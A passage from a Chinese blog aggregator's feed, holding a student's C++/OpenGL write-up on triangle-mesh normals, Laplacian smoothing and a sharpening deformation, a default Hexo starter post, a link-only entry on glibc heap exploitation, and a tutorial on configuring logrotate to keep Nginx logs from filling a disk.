HalfedgeHandle firstHH = halfedge_handle(_vh);</span><br><span class="line">    FacetHandle fh = facet_handle(firstHH);</span><br><span class="line">    norm = norm + calc_normal(fh);</span><br><span class="line">    HalfedgeHandle hh = opposite_halfedge_handle(next_halfedge_handle(firstHH));</span><br><span class="line">    <span class="keyword">while</span> (hh != firstHH) &#123;</span><br><span class="line">      norm = norm + calc_normal(fh);</span><br><span class="line">      hh = opposite_halfedge_handle(next_halfedge_handle(hh));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> norm.normalize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="task3"><a href="#task3" class="headerlink" title="task3"></a>task3</h2><blockquote><p>用OpenGL把三角网格中每个三角面片(face)的法向画出来（提示：在每个三角面片的重心处画）；20分</p></blockquote><p>此函数声明为：bool ogl_writer2(bool _orient = true, bool _smooth = false);<br>Tips: 可以参照函数bool ogl_writer(bool  _orient = true, bool _smooth = false)的来实现，这时只需要在每个三角面片中画出法向即可（法向用Line表示。按键盘上”m”可以查看画出面片法向后的结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="class"><span class="keyword">class</span> <span class="title">Mesh</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">bool</span> <span class="title">ReaderWriterT</span>&lt;Mesh&gt;:</span>:ogl_writer2(<span class="keyword">bool</span> _orient, <span class="keyword">bool</span> _smooth)&#123;<span class="comment">////在里面把三角面片法向画出</span></span><br><span class="line">  HalfedgeHandle       cshh;</span><br><span class="line">  Mesh::FacetIterator  fit(mesh_-&gt;facet_begin());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//glShadeModel(GL_FLAT);</span></span><br><span class="line">    glShadeModel(GL_SMOOTH);</span><br><span class="line">    <span class="keyword">int</span> orient = <span class="literal">true</span>;<span class="comment">// (_orient) ? 1 : -1; </span></span><br><span class="line">    mesh_-&gt;update_normals();<span class="comment">//计算面法向和点法向</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (; fit != mesh_-&gt;facet_end(); ++fit) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((*fit).status_.is_deleted()) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">      cshh = fit-&gt;halfedge_handle_;</span><br><span class="line">      FacetHandle fh = mesh_-&gt;facet_handle(cshh);</span><br><span class="line">      <span class="keyword">const</span> VertexHandle&amp; vh0 = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line">      glColor3f(<span class="number">1.0</span>, <span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">      glBegin(GL_LINES);</span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> VertexHandle&amp; vh = mesh_-&gt;vertex_handle(cshh);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//glNormal3fv(mesh_-&gt;normal(fh)*orient);</span></span><br><span class="line">        <span class="comment">//glVertex3fv(mesh_-&gt;coord(vh));</span></span><br><span class="line">        cshh = mesh_-&gt;next_halfedge_handle(cshh);</span><br><span class="line">        </span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh));</span><br><span class="line">        glVertex3fv(mesh_-&gt;calc_centroid(fh) + mesh_-&gt;normal(fh));</span><br><span class="line">      &#125; <span class="keyword">while</span> (cshh != fit-&gt;halfedge_handle_);</span><br><span class="line">      glEnd();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下:</p><p><img src="https://qiniu.karlrixon.cn/blog/181029/3FF0CJmga7.png?imageslim" alt="mark">  </p><h2 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h2><blockquote><p>实现一种简单的三角网格去噪算法（例如拉普拉斯光顺）；30分</p></blockquote><p>此函数声明为：void Laplacian_Smoothing();//////////////////实现一种三角网格去噪算法<br>Tips: 可以参照已经实现的两个去噪算法；按键盘上”b”可以查看去噪结果。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:Laplacian_Smoothing()&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/////请实现自己的去噪算法////////</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input laplacian vertex update iterations(5-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] /= j;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ = updateVertexPosition[i];</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of laplacian vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：<br>去噪前<img src="https://qiniu.karlrixon.cn/blog/181029/kagkgc82Eb.png?imageslim" alt="mark">去噪后<img src="https://qiniu.karlrixon.cn/blog/181029/b8ED4jA0lE.png?imageslim" alt="mark"></p><h2 id="task5"><a href="#task5" class="headerlink" title="task5"></a>task5</h2><blockquote><p>（可选/可做可不做）实现一种基于三角网格的操作（例如，特征提取，三角网格分割，三角网格变形等等）；20分</p></blockquote><p>此函数声明为: void mesh_process();</p><p>思路：先求出一个点的一环邻接顶点，将每个点到该顶点的向量相加，将算得的向量加到该点原坐标上得到新坐标。步骤是先计算每个点的新坐标，存储到容器，然后统一修改程序中mesh的顶点数据。</p><p>代码如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="class"><span class="keyword">class</span> <span class="title">ExItems</span>&gt;</span></span><br><span class="line"><span class="class"><span class="title">void</span> <span class="title">ExKernelT</span>&lt;ExItems&gt;:</span>:mesh_process()&#123;<span class="comment">///////(可选，在三角网格上实现一种操作，例如特征提取，网格分割，三角网格变形等等)</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> vertex_num = vertex_size();</span><br><span class="line">  <span class="keyword">int</span> iterations;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Input sharpening vertex update iterations(1-30次): "</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; iterations;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"由于迭代，比较耗时！"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Please wait.....  "</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  <span class="keyword">clock_t</span> t1 = clock();</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;Coord&gt; updateVertexPosition;</span><br><span class="line">    updateVertexPosition.resize(vertex_num);</span><br><span class="line">    VertexIterator vi(vertex_begin());</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; vi != vertex_end(); vi++) &#123;</span><br><span class="line">      HalfedgeHandle&amp; hh = vi-&gt;halfedge_handle_;</span><br><span class="line">      HalfedgeHandle css(opposite_halfedge_handle(hh));</span><br><span class="line">      <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">      <span class="comment">//Coord cd(0, 0, 0);</span></span><br><span class="line">      <span class="keyword">do</span> &#123;</span><br><span class="line">        updateVertexPosition[i] += coord(vertex_handle(css));</span><br><span class="line">        <span class="comment">//cd += coord(vertex_handle(css));</span></span><br><span class="line">        j++;</span><br><span class="line">        css = opposite_halfedge_handle(prev_halfedge_handle(css));</span><br><span class="line">      &#125; <span class="keyword">while</span> (opposite_halfedge_handle(css) != hh);</span><br><span class="line">      updateVertexPosition[i] -= coord(vertex_handle(hh))*j;</span><br><span class="line">      updateVertexPosition[i] *= <span class="number">-1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//updateVertexPosition.push_back(cd/j);</span></span><br><span class="line">    &#125;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//std::vector&lt;Coord&gt;::iterator vpi = updateVertexPosition.begin();</span></span><br><span class="line">    <span class="keyword">for</span> (vi = vertex_begin(); vi != vertex_end(); vi++) &#123;</span><br><span class="line">      vi-&gt;coord_ += updateVertexPosition[i]*<span class="number">0.1</span>;</span><br><span class="line">      i++;</span><br><span class="line">      <span class="comment">//vpi++;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">while</span> (--iterations);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">clock_t</span> t2 = clock();</span><br><span class="line">  <span class="comment">//t2 = (t2-t1)/CLOCKS_PER_SEC;</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"The time of sharpening vertex updating: "</span> &lt;&lt; (t2 - t1)*<span class="number">1.0</span> / CLOCKS_PER_SEC &lt;&lt; <span class="string">"s"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>原始图形<img src="https://qiniu.karlrixon.cn/blog/181029/D4LKhgkkdi.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/eE8bBdcl4L.png?imageslim" alt="mark"><br>去噪后<img src="https://qiniu.karlrixon.cn/blog/181109/3b9c2im837.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/6ll9hEAIHb.png?imageslim" alt="mark"><br>变形后<img src="https://qiniu.karlrixon.cn/blog/181109/f476cgEAhE.png?imageslim" alt="mark"><img src="https://qiniu.karlrixon.cn/blog/181109/74jl6gbh05.png?imageslim" alt="mark"></p><h2 id="思路总结-amp-遇到的问题"><a href="#思路总结-amp-遇到的问题" class="headerlink" title="思路总结&amp;遇到的问题"></a>思路总结&amp;遇到的问题</h2><p>task1中海伦公式注意p表示半周长</p><p>task2中的计算顶点法向的思想是将相邻的所有面片法向相加</p><p>task3使用面片迭代器，调用函数算出三角形中心和法向，使用 <code>glBegin(LINES)</code>画线</p><p>task4要首先算出所有点在一环邻接顶点作用下的正确位置（即邻接顶点相加除以邻接顶点个数），然后统一修改mesh中顶点数据。这里存储所有顶点新位置用到了容器，使用时要注意先给容器分配空间，而且容器下标从0开始，不然会报错容器下标越界</p><p>task5在task4的基础上以另一种方法修改了顶点位置实现一种新的网格变换操作必要时可以自己向内核代码添加一些函数</p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/</id>
        <title><![CDATA[堆利用变迁 Glibc<2.25]]></title>
        <updated>2018-10-25T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"/>
        <content type="text/html" src="https://doublemice.github.io/%E5%A0%86%E5%88%A9%E7%94%A8%E5%8F%98%E8%BF%81-glibc-2.25/"><![CDATA[堆利用变迁 Glibc<2.25]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.karlrixon.cn/2018/12/03/hello-world/</id>
        <title><![CDATA[Hello World]]></title>
        <updated>2018-02-24T03:48:11+08:00</updated>
        <link href="http://blog.karlrixon.cn/2018/12/03/hello-world/"/>
        <content type="text/html" src="http://blog.karlrixon.cn/2018/12/03/hello-world/"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
        <author>
            <name><![CDATA[KarlRixon’s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/logrotate.html</id>
        <title><![CDATA[Logrotate 日志滚动 解决日志占用空间过大]]></title>
        <updated>2017-05-03T16:23:04+08:00</updated>
        <link href="https://www.noisyfox.io/logrotate.html"/>
        <content type="text/html" src="https://www.noisyfox.io/logrotate.html"><![CDATA[<h1>起因</h1>
<p>前几天发现自己的博客没有办法登录了，每次输完密码登录完都会重新跳回登录界面。一开始是怀疑登录的session出了什么问题，因为浏览器开隐身模式后就能登录进去。然而开隐身模式进后台的时候又会出现403错误，于是打算连进数据库把session删除再试试。</p>
<p>然而当我试图连接数据库时却一直提示失败，于是试图重启数据库服务，但是系统提示启动失败。电脑坏了怎么办？重启大法！然而数据库服务依旧无法启动，当时我也是摸不着头脑。明明以前一直好好的服务器怎么说炸就炸呢？</p>
<h1>真相</h1>
<p>后来我机智的看了下磁盘的占用情况：</p>
<pre class="brush: bash; title: ; notranslate">df -hl</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png"><img loading="lazy" class="aligncenter size-full wp-image-483" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/df-hl.png" alt="df -hl" width="543" height="152" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl.png 543w, https://www.noisyfox.io/wp-content/uploads/2017/05/df-hl-300x84.png 300w" sizes="(max-width: 543px) 100vw, 543px" /></a></p>
<p>然后我就震惊了！！<span style="color: #000000;"><del>震惊！过气博主硬盘为何被榨干！这背后究竟是人性的&#8230;（啪</del></span></p>
<p>经过一番折腾，终于找到了问题的所在：</p>
<pre class="brush: bash; title: ; notranslate">du -sh .</pre>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png"><img loading="lazy" class="aligncenter size-full wp-image-484" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/du-sh.png" alt="df -hl" width="481" height="96" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh.png 481w, https://www.noisyfox.io/wp-content/uploads/2017/05/du-sh-300x60.png 300w" sizes="(max-width: 481px) 100vw, 481px" /></a></p>
<p>Nginx 的日志文件居然占用了14G的空间！Why？</p>
<h1>论日志</h1>
<p>日志文件通常情况下是未压缩的明文文本文件，在一个运行时间较长的系统中日志文件的体积会越来越大，甚至远超你的预期。</p>
<p>默认情况下一个服务的同一个日志流（如 Nginx 默认就有 error.log access.log 两个日志流）是输出到同一个日志文件中的，也就是说随着时间的推移，这一日志文件中包含的日志的天数也会越来越多，这就给查看某一特定时间段的日志带来了麻烦（试想一下在一个容量10G，包含了一整年数据的日志文件中查找5月份的日志信息，而且还没有日志辅助工具的帮助，是一件多么痛苦的事情）。并且如果日志文件占用了过大的存储空间，那么人们通常会优先删除最老的日志，保留最近一段时间的日志。如果所有日志信息都储存在同一个文件中，那么想要只删除部分数据也不是一件轻松的活。</p>
<p>再者，日志数据通常都是纯文本数据，并且内容重复度非常之高，如果能够将其压缩存储，那么会大大减小体积。然而日志系统是没有办法将数据追加到一个压缩过的日志文件中去的。如果要压缩日志，那么势必需要将日志数据划分成新、旧两部分，其中旧日志压缩后单独存放，新日志即是当前系统活动的日志文件，仍然是纯文本形式。</p>
<p>综上所述，一个好的日志系统至少需要满足以下几个需求：</p>
<ul>
<li>能够将日志按一定规律拆分成多个文件</li>
<li>能够将非活动的日志压缩</li>
<li>能够控制日志文件体积和数量，当条件满足时自动删除旧日志以释放空间</li>
<li>日志文件名满足一定规律便于排序和筛选</li>
</ul>
<p>以上的需求，通常称为<strong>日志滚动</strong><del>（必考）</del>。</p>
<h1>日志滚动</h1>
<p>道理我都懂，但是Linux的日志系统没有提供这些功能，总不能每天手动重命名、压缩、清空、删除日志吧？</p>
<p><del>天空一声巨响，英雄闪亮登场！</del>这时候一个叫做 <strong>logrotate</strong> 的程序就派上了用处。</p>
<p>根据使用的系统不同，logrotate的安装方式也不尽相同，有些系统更是自带了 logrotate 并且带有很多默认的配置（比如我所使用的 Ubuntu Server）。</p>
<p>你可以在自己的系统上查看一下 /var/log/ 目录下的日志文件，如果见到了类似“服务名.log.0”、“服务名.log.1”等一大堆具有相同服务名称但是带有后缀序号的日志文件，那么可以99%肯定这个系统已经安装了 logrotate 并且能够工作。</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png"><img loading="lazy" class="aligncenter size-full wp-image-492" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logs.png" alt="logrotate" width="663" height="579" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logs.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logs-300x262.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>如果你的系统没有带logrotate，别担心，百度一下就能装上啦！而且配置巨简单！</p>
<p>在 /etc/logrotate.d/ 目录下（不同系统可能有所区别）通常会有很多配置文件，这些文件的名字通常对应了该文件所管辖的服务（文件名仅仅是便于管理，和实际内容没有必然关联）。</p>
<p><a href="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png"><img loading="lazy" class="aligncenter size-full wp-image-494" src="https://www.noisyfox.cn/wp-content/uploads/2017/05/logrotate_cfg.png" alt="logrotate config" width="663" height="435" srcset="https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg.png 663w, https://www.noisyfox.io/wp-content/uploads/2017/05/logrotate_cfg-300x197.png 300w" sizes="(max-width: 663px) 100vw, 663px" /></a></p>
<p>而这些配置文件的格式非常的简要，如图所示。通常第一行以目标日志文件路径起头，可以使用通配符，而后面的花括号内部则是需要应用于该日志文件的滚动规则。</p>
<p>其中几个常用的规则在这里稍微解释一下，通常就够用了。更详细的规则可以自行查找，不再赘述。</p>
<pre class="brush: bash; title: ; notranslate">

/var/log/nginx/*.log {
    daily  # 滚动频率，每天滚动一次。其它可选项为 hourly weekly monthly yearly
    missingok
    rotate 14  # 最多保留14次滚动，超过则删除最老的日志
    maxsize 100M  # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
    compress  # 重要！压缩不活动的日志，默认使用gzip
    delaycompress
    notifempty  # 如果日志为空则不滚动
    create 0640 www-data adm
    sharedscripts
    prerotate  # 在每次滚动前执行的脚本，通常是通知该服务“我要滚动日志啦！先别生成新日志咯！”
        if [ -d /etc/logrotate.d/httpd-prerotate ]; then \
        run-parts /etc/logrotate.d/httpd-prerotate; \
        fi \
    endscript
    postrotate  # 在滚动完成后执行的脚本，通常是通知该服务“日志滚动完成啦！请把后续日志写到新的活动日志文件中去！”
        invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1
    endscript
}

</pre>
<p>如果发现日志滚动后 nginx 依旧在向 access.log.1 中写入日志，而新创建的 access.log 大小始终是0，那么请将上文中的 postrotate 代码改为：</p>
<pre class="brush: bash; title: ; notranslate">

service nginx rotate &gt;/dev/null 2&gt;&amp;1

</pre>
<h1>划重点</h1>
<p>同学A：慢着！刚刚不是说你服务器跑的 Ubuntu Server 默认启用了 logrotate 么？那么为什么你的硬盘还是被这些日志文件吃了个精光呢？按说一共就保留14份日志，也就只有14天的份，还都是压缩过的，怎么会占用这么多呢？</p>
<p>我：<del>谢尔曼M1，坐！</del></p>
<p>问题来了，这个 logrotate 的默认配置文件，少了 <em>maxsize 100M</em> 这一行，也就是说如果说在第二天的滚动开始前，日志就已经占用了过大的空间，以至于剩余空间不足以储存对应日志的压缩文件（因为得先压缩完才能删除原始文件，于是整个过程所需的最大空间是 <em>原始文件体积+压缩后的体积</em>，毕竟不可能一边压缩一边删除原始文件嘛）的话，整个日志滚动就会失败。而我的实际情况就是 access.log.0 文件占用了13G的空间（剩下的13个压缩后的日志一共才1G不到，完美的体现了压缩的好处），剩余的空间不足以对其进行压缩，于是整个日志滚动彻底失效了。</p>
<p>当然了，理想的情况下，如果能够将其设置成全部日志加起来的体积超过一个临界点（比如日志一共5G）那么就自动删除最老的一份日志，那是坠吼嘀！然而 logrotate 并没有提供这样的整体体积限制的功能，于是只好用一些小技巧。注意这两行：</p>
<pre class="brush: bash; title: ; notranslate">
rotate 14 # 最多保留14次滚动，超过则删除最老的日志
maxsize 100M # 重要！活动日志的最大尺寸，超过该尺寸则强制滚动一次
</pre>
<p>通过限制活动日志的体积（也就是尾号是0或者没有后缀的那个日志文件）和保留日志滚动数量，我们能够限制整体的日志大小，也即不超过 14 * 100M = 1.4G。当然这样的缺点就是如果某一天的日志特别多，那么那一天的日志会被拆分成多个（课外题：自行百度，将日志文件后缀设置为当前的日期时间）。</p>
<h1>总结</h1>
<p>不限制日志体积真是坑啊！</p>
<p><a rel="nofollow" href="https://www.noisyfox.io/logrotate.html">Logrotate 日志滚动 解决日志占用空间过大</a>，首发于<a rel="nofollow" href="https://www.noisyfox.io">狐狸的小小窝</a>。</p>]]></content>
        <author>
            <name><![CDATA[狐狸的小小窝]]></name>
        </author>
    </entry>
    
</feed>